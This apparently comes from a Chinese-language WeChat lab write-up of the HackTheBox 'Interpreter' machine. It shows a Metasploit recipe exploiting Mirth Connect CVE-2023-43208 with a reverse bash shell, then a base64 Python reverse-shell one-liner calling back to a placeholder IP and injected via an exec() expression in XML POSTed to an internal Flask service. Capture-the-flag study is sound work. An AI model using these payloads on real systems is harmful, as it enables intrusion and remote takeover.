---
title: HackTheBox Season 10  Interpreter 难度:Medium
url: https://mp.weixin.qq.com/s/PZercr1QCrV0O8Jy5uoTuQ
source: Doonsec's feed
date: 2026-02-22
fetch_date: 2026-02-23T04:16:17.472208
---

# HackTheBox Season 10  Interpreter 难度:Medium

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/cGhMn4Bj3bY5ANFMOk1LcBXp9D3gHFs61dg0lMRdNicgibYibuT98uR9mtklyJcva5Grtcqo4UgG1mia1ERGEDf2B8V9DOIedTyZG2JpCykvGo0/0?wx_fmt=jpeg)

# HackTheBox Season 10 Interpreter 难度:Medium

原创

信益安研究院
信益安研究院

信益安信息安全研究院

![]()

在小说阅读器中沉浸阅读

# Interpreter

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bbOAUAibicbjbYHxXXOpDXU0nEf0micDtJR4ggQM0OBAMwK2Ruu4vFVicWlsmByusyoqglj1mqD9S3Zia3Uyias7iciaA44VXUwiaa8wSHY/640?wx_fmt=png&from=appmsg "null")

## nmap：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bYJWLZNdEicsT8fW3b91rPYvq04FHlVDjcFaukEW8mZnMCYJnibnLn6SY0IruCkEdH8iahWwyISZy0R7Qy76srLPrbpvggyCq6S34/640?wx_fmt=png&from=appmsg "null")

### 访问web端：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bYuN8hgehxibsEGtCecHo9kaupib1XUOib6YdLFtyjs3s6GBTJSSAHyFrSYEyUtWKRHO7Ykibltf3yefPY69KuQUtVmzSun5cAB62w/640?wx_fmt=png&from=appmsg "null")

## 爆目录：

```
dirsearch -u https://10.129.1.230
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bYEMLh63S22nJEptbUZhuVNb7VxPo2Ekfg4DJGhDXRFDCTMBRMBlxQfw7oibT4CBR5EaoACD6rWEicFL5usiaC2d1jQyMibBbbUUzk/640?wx_fmt=png&from=appmsg "null")

### 访问/api目录，看到版本的接口：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3baia558s3ojZdOFozxOHngAgotVy71AmGqRepF1E5g33ncElicicH36qBq54mSh8ubEBNMEnfeYwsAkCqdH2fSeYoiaaIKLMQVeN08/640?wx_fmt=png&from=appmsg "null")

### 访问接口发现报错提示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bbcmwyuugAKkbTeuOf4k71VeqlVz1dXJe3ylP3SoAYDiaCUP2sTD8ZcZtVAp7VDGE0TiaUr977VpR3200mygBsjxWTugJSaJnARg/640?wx_fmt=png&from=appmsg "null")

#### 加个请求头访问发现版本信息：

```
curl -sk https://10.129.1.230/api/server/version -H 'X-Requested-With:xya'
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bbGX8WcoY4ialbHzZiaUUbOKsGWNzNzKeqiay36fJFTS6jqhEVZq0hYQLS1HRfIVzEcIianBykakkMYuZPvEB41sRQUquAI47on7Pc/640?wx_fmt=png&from=appmsg "null")

#### 信息收集发现存在CVE-2023-43208

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3baALYv8kLJKC6TmAfFye9wrfOdxqRXX7icXuD1kjZEBzb4CD9aJvHIpYD864dtv9YphwCzJEDH71d0gkfq6STlrDrrNYZGGuMJo/640?wx_fmt=png&from=appmsg)

####

## CVE-2023-43208利用：

### 简单点直接msf打：

```
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS 10.129.1.230
set RPORT 443
set SSL true
set TARGETURI /
set LHOST tun0
set LPORT 4567
set ForceExploit true
set VERBOSE true
set payload cmd/unix/reverse_bash
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bbNpBXy3wVZicL2gTDvytOlcvO9JYVYbAtjJvc9EOTeOOrYfZc0mFKzvNBm8ic2xlgzgbFy62MEymkvyVhicf3JPlFy27fQwCBzz0/640?wx_fmt=png&from=appmsg "null")

### 发现home下有个账户，user的flag可能在里面但是我们没有权限看:

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3ba12K40cBIic01mUqyHxib5pG5M1zRzjmHNH5ibBESYiabvKDg3rFYTPjsUSia0icX2uDSdiclLdZIX9yJG6MVJzctg4Kr7Lm6LYjeE3o/640?wx_fmt=png&from=appmsg "null")

## 提权：

### 看下内部开了哪些端口：

```
ss -anpt
端口6661是一个Mirth通道，用于通过TCP监听HL7消息
端口54321是一个内部Flask/WerkzeugWeb服务器

Mirth通道执行以下操作:
1.在TCP端囗6661上监听HL7消息(MLLP帧格式)
2.使用MessageBuilder步骤将HL7字段转换为XML
3.将XML POST到http://127.0.0.1:54321/addPatient
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3baK8bGAFiacMiad0AOX2ofmVRicMRJnUmgjnfYDrIbgepIqhor1U67kZrfZJL7ibBXbXbLrCfS3IIsb4AnmLVZ7Ew7SAWk3n0mRPb8/640?wx_fmt=png&from=appmsg)

### 生成反弹 shell 代码并 Base64 编码

```
echo 'import socket,os,pty;s=socket.socket();s.connect(("YOUR-IP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' | base64
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bZIrIxtbW6An0XicFiaQI3sP5NbQw3MDN0m6EkxLWpYDQoZzpsUODAvT79uPePKG2JYvYMvib2SLjnUjmEZnOSogXaQD1prduSaY4/640?wx_fmt=png&from=appmsg "null")

### 构造恶意 XML执行即可

```
python3 - << 'EOF'
import http.client
xml = """<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{exec(__import__("base64").b64decode("<Your Base64 payload here>").decode())}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>"""
conn = http.client.HTTPConnection("127.0.0.1", 54321)
conn.request("POST", "/addPatient", body=xml, headers={"Content-Type":"application/xml"})
resp = conn.getresponse()
print(resp.status, resp.reason)
print(resp.read().decode())
EOF
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bYibjyjUem0jP9LhEsNFqx7icjyQ0ic5XYFUIGsya6KrSJ3UD5ib2ugHsUU6CJjfIfrbO8tGWbUibGksj6j8nTgfn1do3icVjVxpTcOk/640?wx_fmt=png&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bZics1QCLl33wTEzGfpwv98uAxdMy4ezAZ8DRNd1fd2X9rBlZtXibcMDGtpzWwiaR5icnDP1R0bDteGnpyjKXqOYYz1JV4Y3uE2aR4/640?wx_fmt=png&from=appmsg "null")

### 成功拿到root以及user的flag：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bYibSYfAYk3TmESrUnN0RXeHS38wJx4zQ3ebfjBzMp1quDjCGQQ5mic0ghbnKBia7xvJUPhXtJbD34WIHHeNrfaG4bEnASZKKElbM/640?wx_fmt=png&from=appmsg "null")

# 最后

🌟感谢您看到这里，您的支持与关注，是我们持续输出内容的最大动力

🌟欢迎在season 10 赛季期间进群交流

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bbfO6gvCk3VgOCfnIdpSvrwtj9ZxViaX2unrle27Of9djQeIVjfY3onAQY0U6a8RyLzh20Q77vM7TGD9OpXWmp7fRibkWee3sVic8/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/QuEg2icmqMJN031QmqC3zSSEqFE7RmUhmgcPTFGGHIofVlkhte6tRlku5hMKHfMWbOoeOSzfs9CcypicibwibvDGeQ/0?wx_fmt=png)

信益安信息安全研究院

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/QuEg2icmqMJN031QmqC3zSSEqFE7RmUhmgcPTFGGHIofVlkhte6tRlku5hMKHfMWbOoeOSzfs9CcypicibwibvDGeQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过